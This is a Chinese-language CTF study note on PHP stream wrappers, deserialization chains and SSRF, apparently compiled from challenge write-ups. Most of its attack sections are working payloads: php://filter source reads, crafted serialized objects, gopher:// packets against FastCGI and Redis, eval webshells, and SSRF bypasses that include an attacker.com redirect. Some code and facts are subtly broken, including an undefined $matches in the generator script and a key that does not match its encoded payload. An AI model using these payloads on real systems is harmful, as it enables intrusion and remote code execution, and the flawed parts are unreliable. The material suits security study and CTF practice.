---
title: PHP伪协议与反序列化利用
description: 系统梳理 PHP 伪协议（php://filter、php://input、data://、file://、gopher:// 等）利用技巧，深度解析反序列化漏洞中
  __wakeup 绕过（对象计数不匹配）、正则过滤数字绕过（+ 前缀）、base64 编码差异导致的利用细节。补充 SSRF 场景下 file:// 本地文件读取、gopher://
  发送原始 TCP 数据包攻击 FastCGI/Redis、双重 URL 编码绕过解析机制及多种绕过技巧。结合赣网杯2020、攻防世界 unserialize3
  与 Web_php_unserialize、CTFHUB SSRF 靶场实战题目完善利用链。
category: program-analysis
tags:
- PHP
- 伪协议
- 反序列化
- __wakeup
- __toString
- CTF
- 文件读取
- 绕过技巧
- 攻防世界
- SSRF
- gopher
- FastCGI
- Redis
- 双重URL编码
date: 2020-10-01
updated: '2026-11-14'
---
## 概述

本页面系统梳理 PHP 常见伪协议的特性与利用条件，重点分析如何结合 `php://filter` 读取源码、`php://input` 与 `data://` 绕过文件内容校验，以及如何利用 `__toString`、`__wakeup` 等魔术方法配合反序列化实现任意文件读取或代码执行。同时深入覆盖 **SSRF（服务端请求伪造）** 场景下的伪协议利用：`file://` 读取本地文件、`gopher://` 构造原始 TCP 报文攻击内网服务（FastCGI、Redis）、双重 URL 编码绕过解析机制、以及 Userinfo、十六进制 IP、302 跳转、DNS 重绑定等绕过技巧。内容基于 **赣网杯2020**、**攻防世界（Attack-Defense World）高手进阶区**、**CTFHUB SSRF 靶场** 实战题目复现，归档自 [[007攻防实验室]] 微信公众号文章及 [[attack-defense-world-master-advanced-writeup]]、[[ssrf-ctf-exploitation-guide]] 相关题解。

## PHP 常见伪协议速查

> 官方文档：[PHP 封装协议](https://www.php.net/manual/zh/wrappers.php)

| 协议 | 作用 | 关键条件 | 典型 Payload 示例 |
| :--- | :--- | :--- | :--- |
| **file://** | 访问本地文件系统 | 默认开启 | `file:///etc/passwd`、`file:///var/www/html/flag.php` |
| **php://filter** | 读取文件并转换编码（如 Base64） | 默认开启 | `php://filter/read=convert.base64-encode/resource=index.php` |
| **php://input** | 读取 POST 请求原始数据体 | `allow_url_include=On` | `?file=php://input` (POST: `<?php phpinfo();?>`) |
| **data://** | 将数据作为文件流读取 | `allow_url_include=On` <br> `allow_url_fopen=On` <br> PHP>=5.2.0 | `data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b` |
| **zip://** | 读取压缩包内文件 | 默认开启 | `zip://path/to/img.jpg%23shell.php` |
| **zlib://** | 读取压缩流 | 默认开启 | `compress.zlib://path/to/file` |
| **gopher://** | 发送原始 TCP 数据包（SSRF 利用核心） | `allow_url_fopen=On` <br> 支持 TCP 流式传输 | `gopher://127.0.0.1:9000/_POST%20/flag.php...` |
| **dict://** | 字典服务协议（端口探测/数据外带） | 默认开启 | `dict://127.0.0.1:6379/info` |
| **ldap://** | LDAP 协议（较少用） | 需扩展支持 | `ldap://127.0.0.1:389/...` |

> **注意**：`include/require` 等包含函数受 `allow_url_include` 影响；`file_get_contents/fopen/curl` 等读取函数受 `allow_url_fopen` 影响。SSRF 场景多依赖 `curl`、`file_get_contents`、`fopen` 等支持远程协议的函数。

---

## 实战复现一：赣网杯2020 PHP 题目（`__toString` 利用链）

### 题目代码审计

```php
<?php
$sz_txt = $_GET["sz_txt"];
$sz_file = $_GET["sz_file"];
$password = $_GET["password"];

if(isset($sz_txt) && (file_get_contents($sz_txt, 'r') === "welcome to jxsz")){
    echo "<br><h1>".file_get_contents($sz_txt, 'r')."</h1></br>";
    if(preg_match("/flag/", $sz_file)){
        echo "Not now!";
        exit();
    }else{
        include($sz_file); // 提示 useless.php
        $password = unserialize($password);
        echo $password;
    }
}else{
    highlight_file(__FILE__);
}
?>
```

**逻辑梳理**：
1.  **校验点**：`sz_txt` 指向的内容必须完全等于 `"welcome to jxsz"`。
2.  **过滤点**：`sz_file` 不能包含 "flag" 字符串。
3.  **包含点**：包含 `sz_file` (需引入类定义文件 `useless.php`)。
4.  **触发点**：反序列化 `password` 并直接 `echo`，触发 `__toString` 魔术方法。

### 步骤一：绕过内容校验 (构造 "welcome to jxsz")

利用伪协议让 `file_get_contents` 读取可控输入流。

#### 方案 A：`php://input` (需 POST 请求)
*   **条件**：`allow_url_include=On` (题目存在 `include` 且成功，推测开启)。
*   **操作**：GET 参数 `sz_txt=php://input`，POST Body 发送 `welcome to jxsz`。

#### 方案 B：`data://` (推荐，仅需 GET)
*   **条件**：`allow_url_include=On` 且 `allow_url_fopen=On`。
*   **操作**：Base64 编码 `"welcome to jxsz"` -> `d2VsY29tZSB0byBqeHN6`。
*   **Payload**：
    ```text
    ?sz_txt=data://text/plain;base64,d2VsY29tZSB0byBqeHN6
    ```

### 步骤二：读取类定义源码 (`useless.php`)

题目过滤了 `flag` 关键词，注释提示包含 `useless.php`。利用 `php://filter` 读取源码并 Base64 编码输出，避免 PHP 解析执行。

*   **Payload**：
    ```text
    sz_file=php://filter/read=convert.base64-encode/resource=useless.php
    ```
*   **解码后源码**：
    ```php
    <?php
    class Flag{
        public $file;
        public function __tostring(){
            if(isset($this->file)){
                echo file_get_contents($this->file);
                echo "<br>";
                return ("So cool,continue plz");
            }
        }
    }
    ?>
    ```

### 步骤三：构造反序列化利用链 (`__toString` -> 任意文件读取)

**漏洞原理**：
1.  `unserialize($password)` 还原对象。
2.  `echo $password` 将对象作为字符串输出，自动调用 `__toString()`。
3.  `__toString()` 中执行 `file_get_contents($this->file)`，可控 `$file` 属性实现任意文件读取。

**EXP 构造脚本**：
```php
<?php
class Flag{
    public $file = "flag.php"; // 目标文件
    public function __tostring(){
        if(isset($this->file)){
            echo file_get_contents($this->file);
            echo "<br>";
            return ("So cool,continue plz");
        }
    }
}
$password = new Flag();
echo serialize($password);
// 输出: O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
?>
```

**最终综合 Payload** (需同时满足三个参数)：
```text
?sz_txt=data://text/plain;base64,d2VsY29tZSB0byBqeHN6
&sz_file=useless.php                     // 必须包含类定义文件
&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
```

> **关键点**：`sz_file` 必须为 `useless.php` (或包含 Flag 类定义的文件)，否则反序列化时找不到类定义报错 (`__PHP_Incomplete_Class`)，无法触发 `__toString`。

---

## 实战复现二：攻防世界 `unserialize3`（`__wakeup` 绕过——对象计数不匹配）

> 来源：[[attack-defense-world-master-advanced-writeup]] 中的 `unserialize3` 题目。

### 核心原理：`__wakeup` 绕过 (CVE-2016-7124 类似机制)

当 `unserialize()` 处理序列化字符串时，会先解析对象属性个数（冒号后的数字，如 `O:4:"Class":1:{...}` 中的 `1`）。如果声明的属性个数 **大于** 实际序列化字符串中包含的属性个数，PHP 会**跳过** `__wakeup()` 方法的调用，直接创建对象。这是绕过 `__wakeup` 中重置属性、抛出异常等防御逻辑的关键技巧。

### 题目代码逻辑 (推测)

```php
class xctf {
    public $flag = '111';
    function __wakeup() {
        $this->flag = '111'; // 重置 flag，阻止读取敏感文件
    }
}
$password = unserialize($_GET['password']);
```

### 利用步骤

1.  **正常序列化输出**：
    `O:4:"xctf":1:{s:4:"flag";s:3:"111";}`
2.  **修改对象属性计数**：将 `1` 改为 `3` (或任意大于实际属性数的值)。
    `O:4:"xctf":3:{s:4:"flag";s:3:"111";}`
3.  **构造恶意属性值**：将 `flag` 属性值修改为目标文件路径（如 `flag.php`），并调整长度 `s:8:"flag.php"`。
    `O:4:"xctf":3:{s:4:"flag";s:8:"flag.php";}`

### 最终 Payload
```text
?password=O:4:"xctf":3:{s:4:"flag";s:8:"flag.php";}
```
**效果**：`__wakeup` 未执行，`$this->file` 保持为 `flag.php`，后续逻辑（如 `__destruct` 或 `__toString`）读取 Flag。

---

## 实战复现三：攻防世界 `Web_php_unserialize`（综合绕过链：`__wakeup` + 正则绕过 + Base64 差异）

> 来源：[[attack-defense-world-master-advanced-writeup]] 中的 `Web_php_unserialize` 题目。

该题目综合考察了三个关键绕过点，是反序列化利用链构造的经典案例。

### 题目代码审计 (关键片段)

```php
<?php
// ... 前置代码 ...
$var = $_GET['var'];

// 1. 正则过滤数字
if (preg_match('/\d+/', $var)) {
    die("No numbers allowed!");
}

// 2. Base64 解码后反序列化
$data = base64_decode($var);
$obj = unserialize($data);

// ... 后续触发点 (如 __destruct 调用 highlight_file) ...
?>
```

### 绕过点一：正则过滤数字绕过（`+` 前缀）

*   **过滤规则**：`preg_match('/\d+/', $var)` 禁止出现数字字符 `0-9`。
*   **序列化格式痛点**：PHP 序列化字符串 **必须** 包含数字（对象属性计数、字符串长度、整数值等），如 `O:4:"Demo":1:{s:4:"file";s:8:"flag.php";}` 中的 `4`, `1`, `4`, `8`。
*   **绕过技巧**：PHP 在解析序列化字符串时，支持 **`+` 号前缀的整数** (如 `:+4`, `:+1`, `:+8`)。
*   **操作**：将序列化字符串中所有的数字 `N` 替换为 `+N`。
    *   原：`O:4:"Demo":1:{s:4:"file";s:8:"flag.php";}`
    *   绕过后：`O:+4:"Demo":+1:{s:+4:"file";s:+8:"flag.php";}`

### 绕过点二：`__wakeup` 绕过（对象计数不匹配）

*   **防御代码**：
    ```php
    function __wakeup() {
        if ($this->file != 'index.php') {
            $this->file = 'index.php'; // 重置文件名
        }
    }
    ```
*   **利用方式**：同 `unserialize3`，修改对象声明的属性计数大于实际属性数。
*   **结合绕过点一**：计数数字也需加 `+` 号。
    *   修改前：`O:+4:"Demo":+1:{...}`
    *   修改后：`O:+4:"Demo":+2:{s:+4:"file";s:+8:"flag.php";}` (声明 2 个属性，实际只有 1 个)

### 绕过点三：Base64 编码差异（本地生成 vs 在线工具/手工替换）

*   **现象**：直接对修改后的序列化字符串进行 `base64_encode` 可能因特殊字符（如 `:+`、花括号、分号、引号）在不同环境（在线工具、PHP `serialize()` 函数、手工字符串拼接）下产生 **不可见字符、空格、换行符差异**，导致解码后反序列化失败（报错 `unserialize(): Error at offset...`）。
*   **根因**：
    1.  在线 Base64 编码工具可能对输入字符串进行 `trim()` 或 URL 编码处理。
    2.  PHP `serialize()` 生成的字符串包含精确的长度计算，手工修改长度极易出错。
    3.  `:+` 这种非标准序列化格式虽然 PHP 解析器接受，但部分库可能不支持生成。
*   **最佳实践（本地化脚本生成）**：
    编写本地 PHP 脚本，**通过代码逻辑构造对象、修改属性、序列化、字符串替换、Base64 编码**，保证字节级一致性。

**本地 EXP 生成脚本**：
```php
<?php
class Demo {
    private $file = 'index.php'; // 需与目标类定义一致 (包括访问修饰符 private/protected/public)
    
    public function __construct($file) {
        $this->file = $file;
    }
    
    function __destruct() {
        echo @highlight_file($this->file, true);
    }
    
    function __wakeup() {
        if ($this->file != 'index.php') {
            $this->file = 'index.php';
        }
    }
}

// 1. 实例化对象，设置目标文件
$obj = new Demo('fl4g.php');

// 2. 序列化
$a = serialize($obj);
// 输出示例: O:4:"Demo":1:{s:4:"file";s:8:"fl4g.php";} (注意私有属性序列化时会包含 \00Demo\00file)

// 3. 代码级替换：绕过数字正则 (\d+) -> 加 + 号
// 注意：私有属性名序列化格式为 s:13:"\00Demo\00file"，长度计数也需修改
$b = str_replace([':1:', ':4:', ':8:', ':13:'], [':+1:', ':+4:', ':+8:', ':+13:'], $a);
// 更稳健的正则替换所有数字 (除非数字在字符串内容中，但此处文件名无数字)
$b = preg_replace('/(?<!:):(\d+)/', ':+$1', $a); // 简略示例，实际需精确匹配格式字段

// 4. 绕过 __wakeup：修改对象属性计数 (O:4:"Demo":1 -> O:4:"Demo":+2)
// 假设原属性计数为 1
$b = preg_replace('/(O:\+\d+:"Demo":)\+(\d+)/', '$1+'.($matches[2]+1), $b); // 计数+1

// 5. Base64 编码输出
echo "Raw Serialized: " . $b . "\n";
echo "Base64 Payload: " . base64_encode($b) . "\n";
?>
```

> **关键细节**：
> *   **属性访问修饰符**：目标类如果是 `private $file`，序列化时属性名会变为 `\00ClassName\00file` (长度含两个空字节)，替换长度时必须精确计算。建议本地定义 **完全一致的类结构** 让 PHP 引擎自动计算长度。
> *   **空格与换行**：`base64_encode` 输出无换行，直接用于 URL 参数需 `urlencode` (处理 `+`, `/`, `=`)。

### 最终攻击流程

1.  本地运行上述脚本获取 `Base64 Payload`。
2.  URL 编码 Payload (特别是 `+` 号变 `%2B`, `/` 变 `%2F`, `=` 变 `%3D`)。
3.  请求目标：`http://target/?var=<URL_Encoded_Base64_Payload>`。
4.  触发 `__destruct` (脚本结束) -> 读取 `fl4g.php` 内容高亮输出。

---

## SSRF 场景下的伪协议深度利用

> 来源：[[ssrf-ctf-exploitation-guide]]、CTFHUB SSRF 靶场实战复现 (归档文章 `CTFHUB靶场闯关--SSRF漏洞`)。

SSRF（Server-Side Request Forgery）漏洞允许攻击者控制服务端发起的请求。结合 PHP 伪协议，可实现内网探测、本地文件读取、攻击内网服务（FastCGI、Redis）、绕过限制等完整利用链。

### file:// 协议：本地文件读取

最基础的 SSRF 利用，直接读取服务器本地文件系统。

*   **适用函数**：`file_get_contents`、`fopen`、`curl` (需开启 `CURLOPT_FOLLOWLOCATION` 且支持 file 协议)、`SoapClient` 等。
*   **典型场景**：读取 Web 目录源码、配置文件、敏感文件。
*   **Payload 示例**：
    ```text
    # 读取 Web 根目录 index.php 源码
    ?url=file:///var/www/html/index.php
    
    # 读取 flag 文件
    ?url=file:///var/www/html/flag.php
    
    # 读取 /etc/passwd
    ?url=file:///etc/passwd
    ```
*   **实战案例 (CTFHUB - 伪协议读取文件)**：
    目标存在 `url` 参数，直接使用 `file:///var/www/html/index.php` 读取源码，发现 `flag.php` 中包含 key 值，后续配合 gopher 协议 POST 提交 key 获取 Flag。

### gopher:// 协议：发送原始 TCP 数据包 (SSRF 核心利器)

`gopher://` 协议可发送任意 TCP 数据流，是 SSRF 攻击内网非 HTTP 服务（FastCGI、Redis、MySQL、FTP 等）的核心手段。

#### 协议格式与 `_` 前缀机制

*   **格式**：`gopher://<host>:<port>/_<TCP_DATA>`
*   **关键细节**：URL 路径部分 **必须以 `/_` 开头** (即 `/_` 后跟 TCP 数据)。因为客户端 (如 `curl`) 解析 gopher URL 时，会丢弃路径的第一个字符。
    *   验证：`curl gopher://127.0.0.1:2333/abcd` -> 服务端收到 `bcd`；`curl gopher://127.0.0.1:2333/_abcd` -> 服务端收到 `abcd`。

#### 双重 URL 编码绕过解析机制

**核心原理**：SSRF 利用链通常包含 **两层请求解析**：
1.  **第一层**：攻击者构造的 Payload 经 URL 编码传给目标服务器 (Server A)。
2.  **第二层**：Server A 解码后，将 Payload 作为 URL 发起新请求 (到内网 Server B)。Server B 再次解析 URL，提取协议、主机、端口、路径。

因此，Payload 中的特殊字符（如 `\r\n` 即 `%0D%0A`、空格 `%20`、`?` `%3F` 等）必须经过 **两次 URL 编码** 才能在最终到达 Server B 时保持正确格式。

**编码流程**：
```
原始 TCP 报文 (含 \r\n)
    -> 第一次 URL 编码 (将 \r\n -> %0D%0A, 空格 -> %20 等)
    -> 手工修正：将所有 %0A 前加 %0D (即 %0A -> %0D%0A)，确保 CRLF 完整
    -> 第二次 URL 编码 (将 % -> %25, 0 -> %30, D -> %44, A -> %41 ...)
    -> 最终 Payload
```

**编码脚本示例 (Python)**：
```python
import urllib.parse

raw = """POST /flag.php HTTP/1.1
Host: 127.0.0.1:80
Content-Type: application/x-www-form-urlencoded
Content-Length: 36

key=a80ea933ead842996c204517423ae75e"""

# 1. 替换换行为 CRLF
raw = raw.replace('\n', '\r\n')

# 2. 第一次 URL 编码
enc1 = urllib.parse.quote(raw, safe='')

# 3. 关键修正：确保 CRLF 为 %0D%0A (quote 通常只编码 \n 为 %0A，需手工补 %0D)
# 实际中 quote 会将 \r 编码为 %0D，\n 编码为 %0A，故结果已为 %0D%0A
# 但若原始字符串只有 \n，则需手工处理

# 4. 第二次 URL 编码
enc2 = urllib.parse.quote(enc1, safe='')

# 5. 构造最终 gopher URL
payload = f"gopher://127.0.0.1:80/_{enc2}"
print(payload)
```

#### 实战一：POST 请求提交 Key 获取 Flag (CTFHUB - POST)

*   **前置条件**：通过 `file://` 读取 `index.php` 源码，发现重定向逻辑 `header("Location: /?url=_");` 需构造 POST 请求到 `flag.php` 提交 `key`。
*   **原始 HTTP 报文**：
    ```http
    POST /flag.php HTTP/1.1
    Host: 127.0.0.1:80
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 36

    key=a80ea933ead842996c204517423ae75e
    ```
*   **双重编码后 Payload**：
    ```text
    gopher://127.0.0.1:80/_POST%2520%252Fflag.php%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Akey%253Dcdea2306d3bf03cc1976f28bd47357ac
    ```

#### 实战二：文件上传 Getshell (CTFHUB - 文件上传)

*   **场景**：`flag.php` 存在文件上传功能，需构造 multipart/form-data POST 包上传 Webshell。
*   **步骤**：
    1.  修改前端 HTML 添加提交按钮。
    2.  抓包获取完整的上传 POST 报文 (含 Boundary、文件内容 `GIF89a<?php @eval($_POST['pass']);?>`)。
    3.  对报文执行 **双重 URL 编码** (注意 `Content-Length` 必须准确)。
    4.  构造 `gopher://` Payload 发送。
    5.  访问上传后的 Shell 路径执行命令获取 Flag。

#### 实战三：攻击 FastCGI (PHP-FPM) 实现 RCE (CTFHUB - Fastcgi协议)

*   **原理**：PHP-FPM 默认监听 `9000` 端口，支持 FastCGI 协议。通过构造 FastCGI 报文，设置环境变量 `PHP_VALUE` 开启 `auto_prepend_file=php://input` 并注入 PHP 代码，实现任意代码执行。
*   **利用工具**：Python FastCGI Client 脚本 (如文章提供的 `2.py`)。
*   **本地生成 Payload 流程**：
    ```bash
    # 生成攻击 127.0.0.1:9000 的 FastCGI 报文，执行 system('ls /')
    python 2.py -c "<?php var_dump(shell_exec('ls /'));?>" -p 9000 127.0.0.1 /var/www/html/index.php
    ```
*   **抓包/脚本输出原始 TCP 流** -> **双重 URL 编码** -> **构造 gopher:// Payload**。
*   **工具辅助**：`Gopherus` 工具集成 FastCGI 模块，可直接生成双重编码后的 gopher payload。
    ```bash
    # Gopherus 交互式生成
    > gopherus --exploit fastcgi
    > ip: 127.0.0.1
    > port: 9000
    > file: /var/www/html/index.php
    > code: <?php system('ls /'); ?>
    ```
*   **后续利用**：执行 `system('cat /flag_xxx')` 读取 Flag。

#### 实战四：攻击 Redis 未授权访问写 Webshell (CTFHUB - Redis协议)

*   **原理**：Redis 默认监听 `6379` 端口，若无密码认证，可通过 `CONFIG SET dir` 设置工作目录为 Web 目录，`CONFIG SET dbfilename` 设置为 `shell.php`，然后 `SET` 写入 PHP 代码，`SAVE` 落盘。
*   **Redis 协议格式 (RESP)**：`*<argc>\r\n$<len>\r\n<cmd>\r\n...`
*   **利用工具**：`Gopherus` 内置 Redis 模块。
    ```bash
    > gopherus --exploit redis
    > ip: 127.0.0.1
    > port: 6379
    > dir: /var/www/html
    > filename: shell.php
    > command: <?php @eval($_POST['pass']);?>
    ```
*   **注意点**：
    *   生成的 Payload 需 **一次 URL 编码** (Gopherus 输出通常已为单次编码，视目标解析层数调整)。
    *   发送后可能返回 504 Timeout，但 Shell 可能已写入成功。
    *   直接访问 `http://target/shell.php?cmd=system("cat /flag");` 连接。

---

### SSRF 绕过技巧总结

针对目标对 URL 进行的各类校验（白名单、黑名单、解析差异），常用绕过手段如下：

| 绕过类型 | 校验逻辑示例 | 绕过 Payload / 方法 | 核心原理 |
| :--- | :--- | :--- | :--- |
| **Userinfo 欺骗** | `parse_url($url)['host']` 校验宿主 | `http://notfound.ctfhub.com@127.0.0.1/flag.php` | `parse_url` 取 `host` 为 `notfound.ctfhub.com`，但 `curl`/`fopen` 实际请求 `127.0.0.1` (RFC 3986 userinfo 语法)。 |
| **十六进制 IP** | 黑名单过滤 `127.0.0.1`、`localhost` | `http://0x7F000001/flag.php` <br> `http://2130706433/flag.php` (十进制整数) | 浏览器/HTTP 客户端支持十六进制/八进制/整数格式 IP 解析。 |
| **302 跳转** | 校验初始 URL Host，但跟随重定向 | 1. 攻击者控制 VPS 返回 `302 Location: http://127.0.0.1/flag.php` <br> 2. `?url=http://attacker.com/redirect` | 校验通过初始 URL，请求库 (curl 默认/开启 `FOLLOWLOCATION`) 跟随跳转至内网。 |
| **DNS 重绑定** | 校验域名解析 IP (TOCTOU) | 1. 域名 `rbndr.us` 解析先返回公网 IP (通过校验)，再返回 `127.0.0.1` <br> 2. `?url=http://7f000001.7f000002.rbndr.us/flag.php` | 利用 DNS TTL 短、解析记录动态变化，在校验与请求之间切换 IP。工具：`lock.cmpxchg8b.com/rebinder.html`。 |
| **端口绕过** | 仅允许 80/443 端口 | `http://127.0.0.1:80/flag.php` (显性标注) <br> 或利用上述 Userinfo/DNS 绕过隐含端口 | 显性声明允许端口，或绕过宿主校验后任意指定端口。 |
| **协议封装** | 仅允许 http/https | `file://`、`gopher://`、`dict://` 等 (若函数支持) | 利用 PHP 封装协议特性，非 HTTP 协议同样可发起请求。 |

---

## 核心知识点总结

### 伪协议组合拳
*   **`data://` + `php://filter`**：`data://` 用于注入可控字符串绕过校验；`php://filter` 用于源码泄露（绕过 `include` 执行、获取类结构）。
*   **`file://` (SSRF)**：直接读取本地文件，配合 `gopher://` 攻击内网服务。
*   **`gopher://` (万金油)**：构造任意 TCP 报文，攻击 FastCGI、Redis、MySQL、FTP、SMTP 等内网服务，实现 RCE、写 Shell、数据窃取。
*   **条件依赖**：利用前必确认 `phpinfo()` 或报错回显中的 `allow_url_fopen` 与 `allow_url_include` 状态。

### 反序列化魔术方法利用链对比

| 魔术方法 | 触发时机 | 核心利用条件 | 典型绕过/利用点 | 本文涉及题目 |
| :--- | :--- | :--- | :--- | :--- |
| **`__wakeup`** | `unserialize()` 成功后 | 类定义中存在 `__wakeup` 且有防御逻辑 | **对象属性计数不匹配** (声明 > 实际) 绕过执行 | `unserialize3`, `Web_php_unserialize` |
| **`__toString`** | 对象作为字符串使用 (`echo`/拼接) | 代码中直接 `echo $obj` 或字符串拼接 | 控制属性进入 `file_get_contents` / SQL / `file_put_contents` | 赣网杯2020 |
| **`__destruct`** | 对象销毁 (脚本结束/引用计数为0) | 无特殊条件，最通用触发点 | 文件操作、命令执行、链式调用起点 | `Web_php_unserialize` |
| **`__construct`** | 对象创建 (`new`) | 反序列化**不触发** (仅 `new` 触发) | 仅用于本地生成 Payload 时初始化属性 | 本地 EXP 脚本 |
| **`__sleep`** | `serialize()` 之前 | 可控制序列化哪些属性 | 隐藏敏感属性、配合 `__wakeup` 逻辑 | - |

### CTF 反序列化实战避坑指南

1.  **类定义一致性**：反序列化要求目标类在当前命名空间/作用域中已定义 (`include/require` 或自动加载)。本地生成 Payload 时，**必须 1:1 复制目标类代码**（属性名、修饰符 `private/protected/public`、命名空间），否则生成的序列化字符串无法正确还原对象属性（会变成 `__PHP_Incomplete_Class`）。
2.  **数字绕过通用性**：`preg_match('/\d/')` 过滤数字是常见 WAF 规则。`+` 前缀绕过 (`:+1`, `:+8`) 适用于 PHP 原生 `unserialize`。若目标使用 `igbinary` 或其他序列化器需验证兼容性。
3.  **Base64 编码链路**：
    *   `Payload -> base64_encode -> urlencode -> 传输 -> urldecode -> base64_decode -> unserialize`
    *   务必在本地脚本 `echo urlencode(base64_encode($serialized));` 一气呵成，避免手工拼接导致字符串污染。
4.  **私有/受保护属性序列化格式**：
    *   `private $prop` -> `s:length:"\00ClassName\00prop"`
    *   `protected $prop` -> `s:length:"\00*\00prop"`
    *   长度计算包含两个不可见字节 (`\00`)，手工修改极易出错，**强制要求本地代码生成**。

### SSRF 利用核心要点

1.  **协议支持度测试**：优先测试 `file://`、`dict://`、`gopher://`、 `http://`、`https://` 支持情况。
2.  **双重编码是关键**：`gopher://` Payload 必须双重 URL 编码，且注意 CRLF (`%0D%0A`) 完整性。
3.  **内网服务指纹识别**：结合 `dict://` 探测端口 Banner (Redis `INFO`、FastCGI 无 Banner 但可尝试连接)、`file://` 读取配置文件确定服务版本/路径。
4.  **工具链熟练度**：`Gopherus` (生成 gopher payload)、`FastCGI Client` (Python/Go 版)、`Redis CLI` / `Gopherus Redis` 模块、`curl` / `nc` 验证 TCP 报文。
5.  **绕过组合拳**：实际环境常组合多种绕过 (如 DNS 重绑定 + gopher 攻击 Redis)，需灵活搭配。

## 关联页面

*   [[007攻防实验室]] - 文章来源归档库，包含更多 CTF 实战笔记（赣网杯2020等）。
*   [[attack-defense-world-master-advanced-writeup]] - 攻防世界高手进阶区完整 Writeup 索引，包含 `unserialize3`、`Web_php_unserialize` 等题目详解。
*   [[ssrf-ctf-exploitation-guide]] - CTFHUB SSRF 靶场完整利用指南，涵盖内网探测、多协议利用、POST 构造、文件上传、FastCGI/Redis RCE 及双重 URL 编码技巧。
*   [[ssrf-bypass-techniques]] - SSRF 绕过技巧系统梳理：用户信息、十六进制 IP、302 跳转、DNS 重绑定、localhost 绕过等五大核心技巧。
*   [[ctf-show-php-command-execution-bypass-techniques]] - PHP 命令执行与绕过技巧体系，涉及 `disable_functions`、`open_basedir` 等后续利用环境。
*   [[php-webshell-fundamentals-chopper-analysis]] - PHP Webshell 基础与蚁剑流量分析，反序列化/SSRF Getshell 后的后续操作参考。
*   [[internal-network-pivoting-techniques]] - 内网穿透/横向移动技术体系，SSRF 获取内网立足点后的代理隧道搭建实战。

## 参考资源

*   PHP 官方手册：[封装协议](https://www.php.net/manual/zh/wrappers.php)
*   PHP 官方手册：[魔术方法](https://www.php.net/manual/zh/language.oop5.magic.php)
*   PHP 官方手册：[unserialize](https://www.php.net/manual/zh/function.unserialize.php) (注释中有 `__wakeup` 绕过讨论)
*   CVE-2016-7124: PHP `__wakeup` 绕过漏洞分析 (对象计数不匹配)
*   赣网杯2020 Writeup 原文 (微信归档)
*   攻防世界靶场在线实战环境
*   CTFHUB 靶场 SSRF 闯关实战
*   Gopherus: https://github.com/tarunkant/Gopherus
*   FastCGI 协议分析: https://segmentfault.com/a/1190000013112052
*   Redis 未授权访问利用: https://blog.csdn.net/mysteryflower/article/details/94386461
*   DNS Rebinder: https://lock.cmpxchg8b.com/rebinder.html

## 来源

- [007攻防实验室-202007-202010_2](../sources/007攻防实验室-202007-202010_2.md)
- [攻防世界高手进阶区page1](../sources/攻防世界高手进阶区page1.md)
- [0x00实验室-202108-202304_065](../sources/0x00实验室-202108-202304_065.md)
- [CTFHUB靶场闯关--SSRF漏洞](../sources/CTFHUB靶场闯关--SSRF漏洞.md)
- [0x00实验室-202108-202304_069](../sources/0x00实验室-202108-202304_069.md)
